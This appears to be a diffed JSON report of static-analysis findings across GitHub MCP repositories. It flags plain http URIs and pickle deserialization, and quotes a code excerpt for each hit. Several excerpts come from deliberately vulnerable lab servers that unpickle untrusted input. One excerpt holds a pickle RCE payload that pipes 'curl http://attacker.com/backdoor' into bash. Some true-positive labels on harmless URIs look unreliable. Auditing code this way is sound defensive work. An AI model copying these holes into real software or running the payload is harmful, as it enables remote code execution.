+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 7,
+   "estratto": "    1| \"\"\"Container Manager ontology contribution (CONCEPT:AU-KG.ontology.federation-provider-leg).\n    2| \n    3| Data-only subpackage: it carries ``container.ttl`` (the ``owl:Ontology``\n    4| ``http://knuckles.team/kg/container`` module) which the agent-utilities hub federates in via\n    5| the ``agent_utilities.ontology_providers`` entry-point. It holds no business logic\n    6| and no heavy imports so the hub can resolve it cheaply.\n    7| \"\"\""
+  },
+  "branch": "main",
+  "n": 8
+ },
+ {
+  "categoria": "protocol-violation",
+  "repo": "Knuckles-Team/documentdb-mcp",
+  "file": "documentdb_mcp/ontology/__init__.py",
+  "line": 4,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "``http://knuckles.team/kg/documentdb`` module) which the agent-utilities hub federates in via",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 7,
+   "estratto": "    1| \"\"\"Documentdb ontology contribution (CONCEPT:AU-KG.ontology.federation-provider-leg).\n    2| \n    3| Data-only subpackage: it carries ``documentdb.ttl`` (the ``owl:Ontology``\n    4| ``http://knuckles.team/kg/documentdb`` module) which the agent-utilities hub federates in via\n    5| the ``agent_utilities.ontology_providers`` entry-point. It holds no business logic\n    6| and no heavy imports so the hub can resolve it cheaply.\n    7| \"\"\""
+  },
+  "branch": "main",
+  "n": 9
+ },
+ {
+  "categoria": "protocol-violation",
+  "repo": "Knuckles-Team/jellyfin-mcp",
+  "file": "jellyfin_mcp/ontology/__init__.py",
+  "line": 4,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "``http://knuckles.team/kg/media`` module — media asset management and download",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 9,
+   "estratto": "    1| \"\"\"Media & Downloads ontology contribution (CONCEPT:JF-KG.ontology.kg).\n    2| \n    3| Data-only subpackage: it carries ``media.ttl`` (the ``owl:Ontology``\n    4| ``http://knuckles.team/kg/media`` module — media asset management and download\n    5| tracking bridging qBittorrent, Jellyfin and the media downloader: download jobs,\n    6| media assets and their consumption patterns) which the agent-utilities hub\n    7| federates in via the ``agent_utilities.ontology_providers`` entry-point. It holds\n    8| no business logic and no heavy imports so the hub can resolve it cheaply.\n    9| \"\"\""
+  },
+  "branch": "main",
+  "n": 10
+ },
+ {
+  "categoria": "protocol-violation",
+  "repo": "Knuckles-Team/nextcloud-agent",
+  "file": "nextcloud_agent/ontology/__init__.py",
+  "line": 4,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "``http://knuckles.team/kg/nextcloud`` module) which the agent-utilities hub federates in via",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 7,
+   "estratto": "    1| \"\"\"Nextcloud ontology contribution (CONCEPT:AU-KG.ontology.federation-provider-leg).\n    2| \n    3| Data-only subpackage: it carries ``nextcloud.ttl`` (the ``owl:Ontology``\n    4| ``http://knuckles.team/kg/nextcloud`` module) which the agent-utilities hub federates in via\n    5| the ``agent_utilities.ontology_providers`` entry-point. It holds no business logic\n    6| and no heavy imports so the hub can resolve it cheaply.\n    7| \"\"\""
+  },
+  "branch": "main",
+  "n": 11
+ },
+ {
+  "categoria": "protocol-violation",
+  "repo": "Knuckles-Team/searxng-mcp",
+  "file": "searxng_mcp/ontology/__init__.py",
+  "line": 4,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "``http://knuckles.team/kg/searxng`` module — search queries, the ranked web results",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 9,
+   "estratto": "    1| \"\"\"Searxng ontology contribution (CONCEPT:AU-KG.ontology.federation-provider-leg).\n    2| \n    3| Data-only subpackage: it carries ``searxng.ttl`` (the ``owl:Ontology``\n    4| ``http://knuckles.team/kg/searxng`` module — search queries, the ranked web results\n    5| they return, the aggregated search engines, and the serving instance) which the\n    6| agent-utilities hub federates in via the ``agent_utilities.ontology_providers``\n    7| entry-point. It holds no business logic and no heavy imports so the hub can resolve\n    8| it cheaply.\n    9| \"\"\""
+  },
+  "branch": "main",
+  "n": 12
+ },
+ {
+  "categoria": "protocol-violation",
+  "repo": "Knuckles-Team/tunnel-manager",
+  "file": "tunnel_manager/ontology/__init__.py",
+  "line": 4,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "``http://knuckles.team/kg/tunnel`` module) which the agent-utilities hub federates in via",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 7,
+   "estratto": "    1| \"\"\"Tunnel Manager ontology contribution (CONCEPT:AU-KG.ontology.federation-provider-leg).\n    2| \n    3| Data-only subpackage: it carries ``tunnel.ttl`` (the ``owl:Ontology``\n    4| ``http://knuckles.team/kg/tunnel`` module) which the agent-utilities hub federates in via\n    5| the ``agent_utilities.ontology_providers`` entry-point. It holds no business logic\n    6| and no heavy imports so the hub can resolve it cheaply.\n    7| \"\"\""
+  },
+  "branch": "main",
+  "n": 13
+ },
+ {
+  "categoria": "protocol-violation",
+  "repo": "Knuckles-Team/vector-mcp",
+  "file": "vector_mcp/ontology/__init__.py",
+  "line": 4,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "``http://knuckles.team/kg/vector`` module) which the agent-utilities hub federates in via",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 7,
+   "estratto": "    1| \"\"\"Vector ontology contribution (CONCEPT:AU-KG.ontology.federation-provider-leg).\n    2| \n    3| Data-only subpackage: it carries ``vector.ttl`` (the ``owl:Ontology``\n    4| ``http://knuckles.team/kg/vector`` module) which the agent-utilities hub federates in via\n    5| the ``agent_utilities.ontology_providers`` entry-point. It holds no business logic\n    6| and no heavy imports so the hub can resolve it cheaply.\n    7| \"\"\""
+  },
+  "branch": "main",
+  "n": 14
+ },
+ {
+  "categoria": "protocol-violation",
+  "repo": "LeiterConsulting/splunk-discovery-tool",
+  "file": "src/capabilities/install_manager.py",
+  "line": 1196,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "\"http://pypi.python.org/simple\",",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 1438,
+   "estratto": " 1184|             for candidate in collection or []:\n 1185|                 normalized = str(candidate or \"\").strip()\n 1186|                 if normalized and normalized not in merged:\n 1187|                     merged.append(normalized)\n 1188|         return merged\n 1189| \n 1190|     def _is_public_pypi_index(self, value: str) -> bool:\n 1191|         normalized = str(value or \"\").strip().rstrip(\"/\").lower()\n 1192|         return normalized in {\n 1193|             \"https://pypi.org/simple\",\n 1194|             \"http://pypi.org/simple\",\n 1195|             \"https://pypi.python.org/simple\",\n 1196|             \"http://pypi.python.org/simple\",\n 1197|         }\n 1198| \n 1199|     def _build_pip_alternative_methods(self, install_target: str, requires_clearing_no_index: bool = False) -> list[Dict[str, Any]]:\n 1200|         direct_commands: list[str] = []\n 1201|         installer_commands: list[str] = []\n 1202| \n 1203|         if sys.platform.startswith(\"win\"):\n 1204|             if requires_clearing_no_index:\n 1205|                 direct_commands.append(\"Remove-Item Env:PIP_NO_INDEX -ErrorAction SilentlyContinue\")\n 1206|             direct_commands.append(f'\"{sys.executable}\" -m pip install --index-url https://pypi.org/simple --no-cache-dir {install_target}')\n 1207|             installer_commands.append(\".\\\\install.ps1 -PublicOnly\")\n 1208|         else:"
+  },
+  "branch": "main",
+  "n": 15
+ },
+ {
+  "categoria": "insecure-deserialization",
+  "repo": "517739/Trace_mcp",
+  "file": "app/tools/TraTopoRca/tracegnn/visualization/visualization_tool.py",
+  "line": 21,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "Static analysis found a dangerous code pattern in app/tools/TraTopoRca/tracegnn/visualization/visualization_tool.py at line 21. Code: self.result = pickle.loads(snappy.decompress(open(f'tracegnn/visualization/sample_cases/model_dat/case_{case_idx}.pkl', 'rb').read()))",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 228,
+   "estratto": "    9| from typing import *\n   10| from loguru import logger\n   11| import snappy\n   12| import json\n   13| \n   14| \n   15| class WebViewerUtil:\n   16|     def __init__(self,\n   17|                  case_idx: int = 0):\n   18|         # Load data from pickle file\n   19|         logger.info(f\"[WebViewerUtil] Using case: {case_idx}\")\n   20|         logger.info(f\"[WebViewerUtil] Loading self.result from: tracegnn/visualization/sample_cases/model_dat/case_{case_idx}.pkl\")\n   21|         self.result = pickle.loads(snappy.decompress(open(f'tracegnn/visualization/sample_cases/model_dat/case_{case_idx}.pkl', 'rb').read()))\n   22|         logger.info(\"[WebViewerUtil] Loading finished.\")\n   23| \n   24|         # Load id_manager\n   25|         self.id_manager = TraceGraphIDManager('tracegnn/visualization/sample_cases/id_manager')\n   26|         self.nll_info = json.load(open('tracegnn/visualization/sample_cases/model_dat/nll_info.json', 'rt'))\n   27| \n   28|     def _load_between(self, start_ts: int, end_ts: int, before_start_ts: int):\n   29|         anomaly_x, anomaly_y = [], []\n   30|         before_x, before_y = [], []\n   31|         anomaly_idx, before_idx = [], []\n   32|         anomaly_scores = {}\n   33| "
+  },
+  "branch": "main",
+  "n": 1
+ },
+ {
+  "categoria": "insecure-deserialization",
+  "repo": "CMPT782Lab/MCPSecurityLab",
+  "file": "backend.py",
+  "line": 188,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "Static analysis found a dangerous code pattern in backend.py at line 188. Code: obj = pickle.loads(decoded)",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 681,
+   "estratto": "  176|         cursor.execute(query)\n  177|         results = cursor.fetchall()\n  178|         conn.close()\n  179|         return {\"success\": True, \"results\": results, \"count\": len(results)}\n  180|     except Exception as e:\n  181|         return {\"success\": False, \"error\": str(e)}\n  182| \n  183| # 6. DESERIALIZATION\n  184| def deserialize_object_func(serialized_data: str, format_type: str = \"pickle\") -> dict:\n  185|     try:\n  186|         if format_type == \"pickle\":\n  187|             decoded = base64.b64decode(serialized_data)\n  188|             obj = pickle.loads(decoded)\n  189|             return {\"success\": True, \"deserialized\": str(obj), \"type\": str(type(obj))}\n  190|         elif format_type == \"yaml\":\n  191|             obj = yaml.load(serialized_data, Loader=yaml.Loader)\n  192|             return {\"success\": True, \"deserialized\": str(obj)}\n  193|         return {\"success\": False, \"error\": \"Unsupported format\"}\n  194|     except Exception as e:\n  195|         return {\"success\": False, \"error\": str(e)}\n  196| \n  197| def process_config_func(config_data: str) -> dict:\n  198|     try:\n  199|         config = yaml.load(config_data, Loader=yaml.Loader)\n  200|         return {\"success\": True, \"config\": config, \"keys\": list(config.keys()) if isinstance(config, dict) else None}"
+  },
+  "branch": "main",
+  "n": 2
+ },
+ {
+  "categoria": "insecure-deserialization",
+  "repo": "Isaac-theori/Vulnerable-MCP-server",
+  "file": "src/character_counter/server.py",
+  "line": 69,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "Static analysis found a dangerous code pattern in src/character_counter/server.py at line 69. Code: obj = pickle.loads(decoded_data)",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 336,
+   "estratto": "   57|         except Exception as e:\n   58|             return f\"Error writing file: {str(e)}\"\n   59| \n   60|     # ===============================\n   61|     # 취약점 3: 비직렬화 공격 (Deserialization)\n   62|     # ===============================\n   63|     @server.tool()\n   64|     def process_pickled_data(data: str) -> str:\n   65|         \"\"\"Base64로 인코딩된 pickled 데이터를 처리합니다. [취약점: 안전하지 않은 역직렬화]\"\"\"\n   66|         try:\n   67|             # 위험: 신뢰할 수 없는 데이터의 pickle 역직렬화\n   68|             decoded_data = base64.b64decode(data)\n   69|             obj = pickle.loads(decoded_data)\n   70|             return f\"Processed object: {str(obj)}\"\n   71|         except Exception as e:\n   72|             return f\"Error processing data: {str(e)}\"\n   73| \n   74|     # ===============================\n   75|     # 취약점 4: SQL 인젝션\n   76|     # ===============================\n   77|     @server.tool()\n   78|     def search_user_database(username: str) -> str:\n   79|         \"\"\"사용자 데이터베이스에서 검색합니다. [취약점: SQL 인젝션]\"\"\"\n   80|         try:\n   81|             # 임시 데이터베이스 생성"
+  },
+  "branch": "main",
+  "n": 3
+ },
+ {
+  "categoria": "insecure-deserialization",
+  "repo": "Karanxa/dvmcp",
+  "file": "app.py",
+  "line": 32,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "Static analysis found a dangerous code pattern in app.py at line 32. Code: model_data = pickle.loads(model_file.read())",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 93,
+   "estratto": "   20| def load_model():\n   21|     \"\"\"\n   22|     Vulnerability 1: Unsafe Deserialization\n   23|     This endpoint accepts serialized model data and loads it without proper validation\n   24|     \"\"\"\n   25|     if 'model' not in request.files:\n   26|         return jsonify({'error': 'No model file provided'}), 400\n   27|     \n   28|     model_file = request.files['model']\n   29|     model_name = request.form.get('name', 'default_model')\n   30|     \n   31|     # VULNERABLE: Unsafe pickle loading\n   32|     model_data = pickle.loads(model_file.read())\n   33|     MODEL_STORE[model_name] = model_data\n   34|     \n   35|     return jsonify({'message': f'Model {model_name} loaded successfully'})\n   36| \n   37| @app.route('/api/v1/model/predict', methods=['POST'])\n   38| def predict():\n   39|     \"\"\"\n   40|     Vulnerability 2: Injection in Model Input\n   41|     This endpoint doesn't properly sanitize or validate model inputs\n   42|     \"\"\"\n   43|     data = request.get_json()\n   44|     model_name = data.get('model_name', 'default_model')"
+  },
+  "branch": "main",
+  "n": 4
+ },
+ {
+  "categoria": "insecure-deserialization",
+  "repo": "MohamedSherifAbdelsamiea/prometheus-remote-mcp-CDK",
+  "file": "lambda-mcp-wrapper/lambda/loguru/_logger.py",
+  "line": 1528,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "Static analysis found a dangerous code pattern in lambda-mcp-wrapper/lambda/loguru/_logger.py at line 1528. Code: ...     record = pickle.loads(pipe.read())",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 2139,
+   "estratto": " 1516|         >>> logger.add(sys.stderr, format=\"{extra[utc]} {message}\")\n 1517|         >>> logger = logger.patch(lambda record: record[\"extra\"].update(utc=datetime.utcnow())\n 1518|         >>> logger.info(\"That's way, you can log messages with time displayed in UTC\")\n 1519| \n 1520|         >>> def wrapper(func):\n 1521|         ...     @functools.wraps(func)\n 1522|         ...     def wrapped(*args, **kwargs):\n 1523|         ...         logger.patch(lambda r: r.update(function=func.__name__)).info(\"Wrapped!\")\n 1524|         ...         return func(*args, **kwargs)\n 1525|         ...     return wrapped\n 1526| \n 1527|         >>> def recv_record_from_network(pipe):\n 1528|         ...     record = pickle.loads(pipe.read())\n 1529|         ...     level, message = record[\"level\"], record[\"message\"]\n 1530|         ...     logger.patch(lambda r: r.update(record)).log(level, message)\n 1531|         \"\"\"\n 1532|         *options, patchers, extra = self._options\n 1533|         return Logger(self._core, *options, [*patchers, patcher], extra)\n 1534| \n 1535|     def level(self, name, no=None, color=None, icon=None):\n 1536|         r\"\"\"Add, update or retrieve a logging level.\n 1537| \n 1538|         Logging levels are defined by their ``name`` to which a severity ``no``, an ansi ``color``\n 1539|         tag and an ``icon`` are associated and possibly modified at run-time. To |log| to a custom\n 1540|         level, you should necessarily use its name, the severity number is not linked back to levels"
+  },
+  "branch": "main",
+  "n": 5
+ },
+ {
+  "categoria": "insecure-deserialization",
+  "repo": "NineSunsInc/mighty-security",
+  "file": "src/analyzers/persistent_cache.py",
+  "line": 93,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "Static analysis found a dangerous code pattern in src/analyzers/persistent_cache.py at line 93. Code: analysis_result = pickle.loads(row[0])",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 324,
+   "estratto": "   81| \n   82|                     if row:\n   83|                         # Update access statistics\n   84|                         conn.execute(\n   85|                             \"UPDATE analysis_cache SET last_accessed = CURRENT_TIMESTAMP, access_count = access_count + 1 WHERE content_hash = ?\",\n   86|                             (content_hash,)\n   87|                         )\n   88|                         conn.commit()\n   89| \n   90|                         self._hits += 1\n   91| \n   92|                         # Deserialize result\n   93|                         analysis_result = pickle.loads(row[0])\n   94|                         logger.debug(f\"Cache HIT for {file_path.name} (hash: {content_hash})\")\n   95|                         return analysis_result\n   96|                     else:\n   97|                         self._misses += 1\n   98|                         logger.debug(f\"Cache MISS for {file_path.name} (hash: {content_hash})\")\n   99|                         return None\n  100| \n  101|             except Exception as e:\n  102|                 logger.error(f\"Cache read error: {e}\")\n  103|                 self._misses += 1\n  104|                 return None\n  105| "
+  },
+  "branch": "main",
+  "n": 6
+ },
+ {
+  "categoria": "insecure-deserialization",
+  "repo": "WhiteDragonAI/mem-agent-mcp",
+  "file": "agent/engine.py",
+  "line": 304,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "Static analysis found a dangerous code pattern in agent/engine.py at line 304. Code: local_vars, error_msg = pickle.loads(result.stdout)",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 332,
+   "estratto": "  292|             env=env,\n  293|         )\n  294|     except subprocess.TimeoutExpired:\n  295|         logger.error(\n  296|             \"Sandboxed code exceeded time limit of %d seconds; terminating.\", timeout\n  297|         )\n  298|         return None, f\"TimeoutError: Code execution exceeded {timeout} seconds.\"\n  299| \n  300|     if result.returncode != 0:\n  301|         return None, result.stderr.decode().strip()\n  302| \n  303|     try:\n  304|         local_vars, error_msg = pickle.loads(result.stdout)\n  305|     except Exception as e:\n  306|         return None, f\"Failed to decode sandbox output: {e}\"\n  307| \n  308|     if error_msg is None:\n  309|         error_msg = \"\"\n  310| \n  311|     return local_vars, error_msg\n  312| \n  313| \n  314| def _subprocess_entry() -> None:\n  315|     \"\"\"Entry point for sandbox subprocess.\"\"\"\n  316|     params_b64 = os.environ.get(\"SANDBOX_PARAMS\")"
+  },
+  "branch": "main",
+  "n": 7
+ },
+ {
+  "categoria": "insecure-deserialization",
+  "repo": "aleks-aeon/aeon-mem-agent-mcp",
+  "file": "agent/engine.py",
+  "line": 304,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "Static analysis found a dangerous code pattern in agent/engine.py at line 304. Code: local_vars, error_msg = pickle.loads(result.stdout)",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 332,
+   "estratto": "  292|             env=env,\n  293|         )\n  294|     except subprocess.TimeoutExpired:\n  295|         logger.error(\n  296|             \"Sandboxed code exceeded time limit of %d seconds; terminating.\", timeout\n  297|         )\n  298|         return None, f\"TimeoutError: Code execution exceeded {timeout} seconds.\"\n  299| \n  300|     if result.returncode != 0:\n  301|         return None, result.stderr.decode().strip()\n  302| \n  303|     try:\n  304|         local_vars, error_msg = pickle.loads(result.stdout)\n  305|     except Exception as e:\n  306|         return None, f\"Failed to decode sandbox output: {e}\"\n  307| \n  308|     if error_msg is None:\n  309|         error_msg = \"\"\n  310| \n  311|     return local_vars, error_msg\n  312| \n  313| \n  314| def _subprocess_entry() -> None:\n  315|     \"\"\"Entry point for sandbox subprocess.\"\"\"\n  316|     params_b64 = os.environ.get(\"SANDBOX_PARAMS\")"
+  },
+  "branch": "main",
+  "n": 8
+ },
+ {
+  "categoria": "insecure-deserialization",
+  "repo": "assafelovic/gpt-researcher",
+  "file": "gpt_researcher/scraper/browser/browser.py",
+  "line": 125,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "Static analysis found a dangerous code pattern in gpt_researcher/scraper/browser/browser.py at line 125. Code: cookies = pickle.load(open(self.cookie_filename, \"rb\"))",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 260,
+   "estratto": "  113|         try:\n  114|             if self.selenium_web_browser == \"firefox\":\n  115|                 self.driver = webdriver.Firefox(options=options)\n  116|             elif self.selenium_web_browser == \"safari\":\n  117|                 self.driver = webdriver.Safari(options=options)\n  118|             else:  # chrome\n  119|                 if platform == \"linux\" or platform == \"linux2\":\n  120|                     options.add_argument(\"--disable-dev-shm-usage\")\n  121|                     options.add_argument(\"--remote-debugging-port=9222\")\n  122|                 options.add_argument(\"--no-sandbox\")\n  123|                 options.add_experimental_option(\"prefs\", {\"download_restrictions\": 3})\n  124|                 self.driver = webdriver.Chrome(options=options)\n  125| \n  126|             if self.use_browser_cookies:\n  127|                 self._load_browser_cookies()\n  128| \n  129|             # print(f\"{self.selenium_web_browser.capitalize()} driver set up successfully.\")\n  130|         except Exception as e:\n  131|             print(f\"Failed to set up {self.selenium_web_browser} driver: {str(e)}\")\n  132|             print(\"Full stack trace:\")\n  133|             print(traceback.format_exc())\n  134|             raise\n  135| \n  136|     def _load_saved_cookies(self):\n  137|         \"\"\"Load saved cookies before visiting the target URL\"\"\""
+  },
+  "branch": "main",
+  "n": 9
+ },
+ {
+  "categoria": "insecure-deserialization",
+  "repo": "auxilus08/github-docs-mcp-server",
+  "file": "src/github_docs_mcp/hybrid_scorer.py",
+  "line": 289,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "Static analysis found a dangerous code pattern in src/github_docs_mcp/hybrid_scorer.py at line 289. Code: lambda: pickle.load(open(cache_file, 'rb'))",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 406,
+   "estratto": "  277|             return [(i, 0.5, {'tfidf': 0.5, 'semantic': 0.0, 'source_boost': 1.0, 'hybrid': 0.5}) \n  278|                    for i in range(min(len(documents), top_k))]\n  279|                    \n  280|     async def _load_embedding_cache(self):\n  281|         \"\"\"Load cached embeddings from disk.\"\"\"\n  282|         cache_file = self.cache_dir / f\"embeddings_{self.model_name.replace('/', '_')}.pkl\"\n  283|         \n  284|         try:\n  285|             if cache_file.exists():\n  286|                 loop = asyncio.get_event_loop()\n  287|                 self.embedding_cache = await loop.run_in_executor(\n  288|                     None,\n  289|                     lambda: pickle.load(open(cache_file, 'rb'))\n  290|                 )\n  291|                 logger.info(f\"Loaded {len(self.embedding_cache)} cached embeddings\")\n  292|         except Exception as e:\n  293|             logger.warning(f\"Failed to load embedding cache: {e}\")\n  294|             self.embedding_cache = {}\n  295|             \n  296|     async def _save_embedding_cache(self):\n  297|         \"\"\"Save embeddings cache to disk.\"\"\"\n  298|         cache_file = self.cache_dir / f\"embeddings_{self.model_name.replace('/', '_')}.pkl\"\n  299|         \n  300|         try:\n  301|             loop = asyncio.get_event_loop()"
+  },
+  "branch": "main",
+  "n": 10
+ },
+ {
+  "categoria": "insecure-deserialization",
+  "repo": "bjoernbethge/smolagents-ace",
+  "file": "src/smolagents/remote_executors.py",
+  "line": 98,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "Static analysis found a dangerous code pattern in src/smolagents/remote_executors.py at line 98. Code: vars_dict = pickle.loads(base64.b64decode('{pickled_vars}'))",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 1129,
+   "estratto": "   86|             code_output = self.run_code_raise_errors(code)\n   87|             self.logger.log(code_output.logs)\n   88| \n   89|     def send_variables(self, variables: dict[str, Any]):\n   90|         \"\"\"\n   91|         Send variables to the kernel namespace using pickle.\n   92|         \"\"\"\n   93|         if not variables:\n   94|             return\n   95|         pickled_vars = base64.b64encode(pickle.dumps(variables)).decode()\n   96|         code = f\"\"\"\n   97| import pickle, base64\n   98| vars_dict = pickle.loads(base64.b64decode('{pickled_vars}'))\n   99| locals().update(vars_dict)\n  100| \"\"\"\n  101|         self.run_code_raise_errors(code)\n  102| \n  103|     def __call__(self, code_action: str) -> CodeOutput:\n  104|         \"\"\"Run the code and determine if it is the final answer.\"\"\"\n  105|         return self.run_code_raise_errors(code_action)\n  106| \n  107|     def install_packages(self, additional_imports: list[str]):\n  108|         if additional_imports:\n  109|             code_output = self.run_code_raise_errors(f\"!pip install {' '.join(additional_imports)}\")\n  110|             self.logger.log(code_output.logs)"
+  },
+  "branch": "main",
+  "n": 11
+ },
+ {
+  "categoria": "insecure-deserialization",
+  "repo": "davidf9999/gx-mcp-server",
+  "file": "gx_mcp_server/storage/sqlite_backend.py",
+  "line": 71,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "Static analysis found a dangerous code pattern in gx_mcp_server/storage/sqlite_backend.py at line 71. Code: return pickle.loads(row[0])",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 109,
+   "estratto": "   59|                     (count - _MAX_ITEMS,),\n   60|                 ).fetchall()\n   61|                 conn.executemany(\"DELETE FROM datasets WHERE id = ?\", to_delete)\n   62|                 conn.commit()\n   63|         return handle\n   64| \n   65|     @staticmethod\n   66|     def get(handle: str) -> pd.DataFrame:\n   67|         conn = _get_conn()\n   68|         row = conn.execute(\"SELECT data FROM datasets WHERE id=?\", (handle,)).fetchone()\n   69|         if row is None:\n   70|             raise KeyError(handle)\n   71|         return pickle.loads(row[0])\n   72| \n   73|     @staticmethod\n   74|     def get_handle_path(handle: str) -> str:\n   75|         df = DataStorage.get(handle)\n   76|         path = f\"/tmp/{handle}.csv\"\n   77|         df.to_csv(path, index=False)\n   78|         return path\n   79| \n   80| \n   81| class ValidationStorage:\n   82|     @staticmethod\n   83|     def add(result: Any) -> str:"
+  },
+  "branch": "main",
+  "n": 12
+ },
+ {
+  "categoria": "insecure-deserialization",
+  "repo": "delonsp/rlm-mcp-server",
+  "file": "src/rlm_mcp/persistence.py",
+  "line": 409,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "Static analysis found a dangerous code pattern in src/rlm_mcp/persistence.py at line 409. Code: embedding = pickle.loads(zlib.decompress(row[4]))",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 654,
+   "estratto": "  397|         try:\n  398|             with sqlite3.connect(self.db_path) as conn:\n  399|                 cursor = conn.cursor()\n  400|                 cursor.execute(\"\"\"\n  401|                     SELECT chunk_index, chunk_text, line_start, line_end, embedding\n  402|                     FROM embeddings WHERE var_name = ?\n  403|                     ORDER BY chunk_index\n  404|                 \"\"\", (var_name,))\n  405|                 rows = cursor.fetchall()\n  406| \n  407|                 result = []\n  408|                 for row in rows:\n  409|                     embedding = pickle.loads(zlib.decompress(row[4]))\n  410|                     result.append({\n  411|                         \"chunk_index\": row[0],\n  412|                         \"chunk_text\": row[1],\n  413|                         \"line_start\": row[2],\n  414|                         \"line_end\": row[3],\n  415|                         \"embedding\": embedding,\n  416|                     })\n  417| \n  418|                 if result:\n  419|                     logger.info(f\"Embeddings de '{var_name}' carregados ({len(result)} chunks)\")\n  420|                 return result\n  421| "
+  },
+  "branch": "main",
+  "n": 13
+ },
+ {
+  "categoria": "insecure-deserialization",
+  "repo": "dylan-gluck/freecrawl-mcp",
+  "file": "src/freecrawl/server.py",
+  "line": 509,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "Static analysis found a dangerous code pattern in src/freecrawl/server.py at line 509. Code: content_dict = pickle.loads(gzip.decompress(data))",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 2163,
+   "estratto": "  497|                     await self.delete(key)\n  498|                     return None\n  499| \n  500|                 # Update hit count\n  501|                 await db.execute(\n  502|                     \"UPDATE cache_entries SET hit_count = hit_count + 1 WHERE cache_key = ?\",\n  503|                     (key,),\n  504|                 )\n  505|                 await db.commit()\n  506| \n  507|                 # Decompress and deserialize\n  508|                 try:\n  509|                     content_dict = pickle.loads(gzip.decompress(data))\n  510|                     return ScrapedContent(**content_dict)\n  511|                 except Exception as e:\n  512|                     logger.warning(f\"Failed to deserialize cached content: {e}\")\n  513|                     await self.delete(key)\n  514|                     return None\n  515| \n  516|         return None\n  517| \n  518|     async def set(\n  519|         self, url: str, content: ScrapedContent, ttl: Optional[int] = None\n  520|     ) -> str:\n  521|         \"\"\"Cache scraped content\"\"\""
+  },
+  "branch": "main",
+  "n": 14
+ },
+ {
+  "categoria": "insecure-deserialization",
+  "repo": "enkryptai/secure-mcp-gateway",
+  "file": "src/secure_mcp_gateway/bad_mcps/rce_mcp.py",
+  "line": 103,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "Static analysis found a dangerous code pattern in src/secure_mcp_gateway/bad_mcps/rce_mcp.py at line 103. Code: Using: pickle.loads(base64.b64decode(pickle_data))",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 489,
+   "estratto": "   91|         \"idempotentHint\": False,\n   92|         \"openWorldHint\": False,\n   93|     },\n   94| )\n   95| async def deserialize_object(ctx: Context, pickle_data: str) -> list[types.TextContent]:\n   96|     \"\"\"Pickle deserialization RCE.\"\"\"\n   97|     return [\n   98|         types.TextContent(\n   99|             type=\"text\",\n  100|             text=\"\"\"[VULNERABILITY: Pickle RCE!]\n  101| \n  102| Deserializing: {pickle_data[:100]}...\n  103| Using: pickle.loads(base64.b64decode(pickle_data))\n  104| \n  105| Pickle RCE Attack Example:\n  106| ```python\n  107| import pickle\n  108| import base64\n  109| import os\n  110| \n  111| class RCE:\n  112|     def __reduce__(self):\n  113|         return (os.system, ('curl http://attacker.com/backdoor | bash',))\n  114| \n  115| payload = base64.b64encode(pickle.dumps(RCE()))"
+  },
+  "branch": "main",
+  "n": 15
+ }
+]
